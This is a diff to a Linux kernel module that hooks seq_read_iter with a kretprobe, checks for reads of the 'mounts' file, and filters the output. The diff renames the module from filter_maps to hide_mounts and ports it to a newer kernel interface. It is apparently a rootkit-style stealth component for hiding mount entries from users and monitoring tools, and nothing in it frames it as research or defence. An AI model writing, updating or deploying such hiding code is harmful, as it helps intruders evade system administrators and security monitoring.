@@ -2,8 +2,6 @@
 #include <linux/module.h>
 #include <linux/kprobes.h>
 #include <linux/seq_file.h>
-#include <linux/slab.h>
-#include <linux/string.h>
 #include <linux/fs.h>
 #include <linux/dcache.h>
 #include <linux/mutex.h>
@@ -14,19 +12,24 @@ static atomic64_t nr_filtered = ATOMIC64_INIT(0);
 
 static int entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-    *(struct file **)ri->data = (struct file *)regs->regs[0];
+    *(struct kiocb **)ri->data = (struct kiocb *)regs->regs[0];
     return 0;
 }
 
 static int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-    struct file *file = *(struct file **)ri->data;
+    struct kiocb *iocb = *(struct kiocb **)ri->data;
+    struct file *file;
     struct seq_file *m;
     ssize_t copied = (ssize_t)regs->regs[0];
     char *buf, *src, *dst;
     int filtered;
 
-    if (copied <= 0 || !file || !file->f_path.dentry)
+    if (copied <= 0 || !iocb)
+        return 0;
+
+    file = iocb->ki_filp;
+    if (!file || !file->f_path.dentry)
         return 0;
 
     if (strcmp(file->f_path.dentry->d_name.name, "mounts") != 0)
@@ -76,30 +79,30 @@ static int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
 }
 
 static struct kretprobe rp = {
-    .kp.symbol_name = "seq_read",
+    .kp.symbol_name = "seq_read_iter",
     .entry_handler = entry_handler,
-    .data_size = sizeof(struct file *),
     .handler = ret_handler,
+    .data_size = sizeof(struct kiocb *),
     .maxactive = 64,
 };
 
-static int __init filter_init(void)
+static int __init hide_init(void)
 {
     int ret = register_kretprobe(&rp);
     if (ret < 0) {
-        printk(KERN_ERR "filter_maps: register_kretprobe failed: %d\n", ret);
+        printk(KERN_ERR "hide_mounts: register_kretprobe failed: %d\n", ret);
         return ret;
     }
-    printk(KERN_INFO "filter_maps: loaded\n");
+    printk(KERN_INFO "hide_mounts: loaded\n");
     return 0;
 }
 
-static void __exit filter_exit(void)
+static void __exit hide_exit(void)
 {
     unregister_kretprobe(&rp);
-    printk(KERN_INFO "filter_maps: unloaded, total=%lld\n",
+    printk(KERN_INFO "hide_mounts: unloaded, total=%lld\n",
            atomic64_read(&nr_filtered));
 }
 
-module_init(filter_init);
-module_exit(filter_exit);
+module_init(hide_init);
+module_exit(hide_exit);
